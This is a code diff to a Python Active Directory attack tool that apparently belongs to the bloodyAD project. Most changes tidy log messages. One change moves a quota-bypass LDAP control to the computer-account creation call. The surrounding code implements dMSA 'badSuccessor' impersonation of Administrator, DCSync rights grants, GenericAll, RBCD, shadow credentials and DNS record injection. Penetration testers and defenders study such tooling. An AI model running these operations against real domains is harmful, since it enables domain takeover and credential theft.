@@ -106,8 +106,8 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     utils.addRight(new_sd, self_sid, access_mask)
 
     dmsa_sama = dmsa + "$"
-    LOG.info(f"[*] Creating DMSA {dmsa_sama} in {ou}")
-    LOG.info(f"[*] Impersonating: {', '.join(t)}")
+    LOG.info(f"Creating DMSA {dmsa_sama} in {ou}")
+    LOG.info(f"Impersonating: {', '.join(t)}")
     attr = {
         "objectClass": ["msDS-DelegatedManagedServiceAccount"],
         "sAMAccountName": dmsa+'$',
@@ -127,7 +127,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
         )
     splitted_url = conn.ldap.co_url.split("-",1)
     if "sspi" in splitted_url[0]:
-        LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or kerbad certstore, e.g.:")
+        LOG.error("SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or kerbad certstore, e.g.:")
         LOG.error(f"badS4U2self 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}' 'krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}' '{dmsa_sama}@{conn.ldap.domainname}' --dmsa")
         return
     
@@ -140,20 +140,20 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
 
     host_params = {"ip": conn.conf.dcip}
     if conn.ldap._serverinfo["dnsHostName"] not in compatible_dcs:
-        LOG.warning("[!] The current DC does not support Kerberos for dMSA")
-        LOG.info(f"[*] Current DC does not support dMSA Kerberos, attempting alternative 2025 DCs: {compatible_dcs}")
+        LOG.warning("The current DC does not support Kerberos for dMSA")
+        LOG.info(f"Current DC does not support dMSA Kerberos, attempting alternative 2025 DCs: {compatible_dcs}")
         host_params = utils.connectReachable(conn, compatible_dcs, ports=[88])
         if not host_params:
-            LOG.error("[-] DC2025 not found, try to reach one of the list above manually:")
+            LOG.error("DC2025 not found, try to reach one of the list above manually:")
             new_netloc = parsed.netloc.split("@")[0] + '@<DC2025_IP>' if '@' in parsed.netloc else parsed.netloc
             url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=query_params))
-            LOG.error(f"[-] badS4U2self '{url}' 'krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}' '{dmsa_sama}@{conn.ldap.domainname}' --dmsa")
+            LOG.error(f"badS4U2self '{url}' 'krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}' '{dmsa_sama}@{conn.ldap.domainname}' --dmsa")
             return
 
     new_netloc = parsed.netloc.split("@")[0] + '@' + host_params["ip"] if '@' in parsed.netloc else parsed.netloc
     url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=query_params))
 
-    LOG.debug(f"[*] Using kerbad url: {url}")
+    LOG.debug(f"Using kerbad url: {url}")
     try:
         cu = factory.KerberosClientFactory.from_url(url)
         client = cu.get_client_blocking()
@@ -161,10 +161,10 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
         target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.ldap.domainname}")
         tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
     except Exception as e:
-        LOG.error(f"[-] Failed to retrieve dMSA TGT")
+        LOG.error(f"Failed to retrieve dMSA TGT")
         if host_params["ip"] != conn.conf.dcip:
-            LOG.error(f"[-] {host_params['ip']} may not be synchronized to {conn.conf.dcip}, wait or try to add dMSA directly on {host_params['ip']}")
-        LOG.error("[-] Try using Rubeus, or something like:")
+            LOG.error(f"{host_params['ip']} may not be synchronized to {conn.conf.dcip}, wait or try to add dMSA directly on {host_params['ip']}")
+        LOG.error("Try using Rubeus, or something like:")
         LOG.error(f"badS4U2self '{url}' 'krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}' '{dmsa_sama}@{conn.ldap.domainname}' --dmsa")
         raise e
 
@@ -174,7 +174,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     ccache = CCACHE().from_kirbi(kirbi)
     ccache_path = path + ".ccache"
     ccache.to_file(path + ".ccache")
-    LOG.info('[+] dMSA TGT stored in ccache file %s' % ccache_path)
+    LOG.info('dMSA TGT stored in ccache file %s' % ccache_path)
 
     dmsa_pack = ticketutil.get_KRBKeys_From_TGSRep(encTGSRepPart)
 
@@ -198,11 +198,8 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
 
     if ou == "DefaultOU":
         container = None
-        # When the requester has specified the LDAP_SERVER_BYPASS_QUOTA_OID control "1.2.840.113556.1.4.2256"
-        # And has been granted the control access right DS-Bypass-Quota on the object
-        # that is the root of the NC in which the operation is to be performed
         for obj in next(
-            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"], controls=[("1.2.840.113556.1.4.2256", False, None)])
+            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
         )["wellKnownObjects"]:
             if "GUID_COMPUTERS_CONTAINER_W" == obj.binary_value:
                 container = obj.dn
@@ -243,8 +240,11 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
         attr["objectClass"].append("dynamicObject")
         attr["entryTTL"] = lifetime
     
-    conn.ldap.bloodyadd(computer_dn, attributes=attr)
-    LOG.info(f"[+] {hostname}$ created")
+    # When the requester specifies LDAP_SERVER_BYPASS_QUOTA_OID control "1.2.840.113556.1.4.2256"
+    # And has been granted the control access right DS-Bypass-Quota (usually only admins) on the NC's root object (e.g. DC=example,DC=com)
+    # Then the requester can bypass the default machine account quota (ms-DS-MachineAccountQuota)
+    conn.ldap.bloodyadd(computer_dn, attributes=attr, controls=[("1.2.840.113556.1.4.2256", False, None)])
+    LOG.info(f"{hostname}$ created")
 
 
 def dcsync(conn, trustee: str):
@@ -274,7 +274,7 @@ def dcsync(conn, trustee: str):
         controls,
     )
 
-    LOG.info(f"[+] {trustee} is now able to DCSync")
+    LOG.info(f"{trustee} is now able to DCSync")
 
 
 # Credits to Kevin Robertson and his script Invoke-DNSUpdate.ps1 from the Powermad framework
@@ -365,7 +365,7 @@ def dnsRecord(
             "dNSTombstoned": False,
         }
         conn.ldap.bloodyadd(record_dn, attributes=record_attr)
-        LOG.info(f"[+] {name} has been successfully added")
+        LOG.info(f"{name} has been successfully added")
         return
 
     new_dnsrecord_list.append(new_dnsrecord.getData())
@@ -373,7 +373,7 @@ def dnsRecord(
     conn.ldap.bloodymodify(
         record_dn, {"dnsRecord": [(Change.REPLACE.value, new_dnsrecord_list)]}
     )
-    LOG.info(f"[+] {name} has been successfully updated")
+    LOG.info(f"{name} has been successfully updated")
 
 
 def genericAll(conn, target: str, trustee: str):
@@ -403,7 +403,7 @@ def genericAll(conn, target: str, trustee: str):
         controls,
     )
 
-    LOG.info(f"[+] {trustee} has now GenericAll on {target}")
+    LOG.info(f"{trustee} has now GenericAll on {target}")
 
 
 def groupMember(conn, group: str, member: str):
@@ -424,7 +424,7 @@ def groupMember(conn, group: str, member: str):
         member_transformed = conn.ldap.dnResolver(member)
 
     conn.ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
-    LOG.info(f"[+] {member} added to {group}")
+    LOG.info(f"{member} added to {group}")
 
 
 def rbcd(conn, target: str, service: str):
@@ -459,7 +459,7 @@ def rbcd(conn, target: str, service: str):
         },
     )
 
-    LOG.info(f"[+] {service} can now impersonate users on {target} via S4U2Proxy")
+    LOG.info(f"{service} can now impersonate users on {target} via S4U2Proxy")
 
 
 def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
@@ -475,13 +475,13 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
 
     if conn.ldap._serverinfo["dnsHostName"] not in compatible_dcs:
         if not compatible_dcs:
-            LOG.error("[-] No DC with Windows Server 2016 or higher found on this domain, operation aborted")
+            LOG.error("No DC with Windows Server 2016 or higher found on this domain, operation aborted")
             return
         LOG.warning(
             "[!] This DC does not seem to support KeyCredentialLink"
         )
 
-        LOG.info(f"[*] Attempting alternative DCs with KeyCredentialLink support: {compatible_dcs}")
+        LOG.info(f"Attempting alternative DCs with KeyCredentialLink support: {compatible_dcs}")
         new_conn = utils.connectReachable(conn, compatible_dcs, ports=[389,636])
         if not new_conn:
             return
@@ -496,7 +496,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
             random.choice(string.ascii_letters + string.digits) for i in range(2)
         )
 
-    LOG.debug("[*] Generating certificate")
+    LOG.debug("Generating certificate")
 
     key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
     subject = x509.Name.from_rfc4514_string(target_dn)
@@ -511,7 +511,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
         .sign(key, hashes.SHA256())
     )
 
-    LOG.debug("[*] Generating KeyCredential")
+    LOG.debug("Generating KeyCredential")
 
     keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
     keyCredential.keyCredentialLink_from_x509(cert)
@@ -521,7 +521,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
         % binascii.hexlify(keyCredential.getKeyID()).decode()
     )
 
-    LOG.debug("[*] Updating the msDS-KeyCredentialLink attribute of %s" % target)
+    LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % target)
 
     key_dnbinary = common.DNBinary()
     key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
@@ -530,7 +530,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
         {"msDS-KeyCredentialLink": [(Change.ADD.value, str(key_dnbinary))]},
     )
 
-    LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")
+    LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
 
     pfx = serialization.pkcs12.serialize_key_and_certificates(
         name=target_dn.encode(),
@@ -551,14 +551,14 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
         pfx_path = path + ".pfx"
         with open(pfx_path, "wb") as f:
             f.write(pfx)
-        LOG.error(f"[-] PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
-        LOG.info(f"[+] PKINIT PFX certificate saved at: %s" % pfx_path)
+        LOG.error(f"PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
+        LOG.info(f"PKINIT PFX certificate saved at: %s" % pfx_path)
         raise e
     finally:
         if client and client.kerberos_TGT:
             ccache_path = path + ".ccache"
             client.ccache.to_file(path + ".ccache")
-            LOG.info('[+] TGT stored in ccache file %s' % ccache_path)
+            LOG.info('TGT stored in ccache file %s' % ccache_path)
         # For the newconn opened if we had to use an alternative DC
         conn.ldap.close()
     
@@ -611,7 +611,7 @@ def uac(conn, target: str, f: list = None):
         target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
     )
 
-    LOG.info(f"[-] {f} property flags added to {target}'s userAccountControl")
+    LOG.info(f"{f} property flags added to {target}'s userAccountControl")
 
 
 def user(conn, sAMAccountName: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
@@ -654,4 +654,4 @@ def user(conn, sAMAccountName: str, newpass: str, ou: str = "DefaultOU", lifetim
         attr["entryTTL"] = lifetime
 
     conn.ldap.bloodyadd(user_dn, attributes=attr)
-    LOG.info(f"[+] {sAMAccountName} created")
+    LOG.info(f"{sAMAccountName} created")
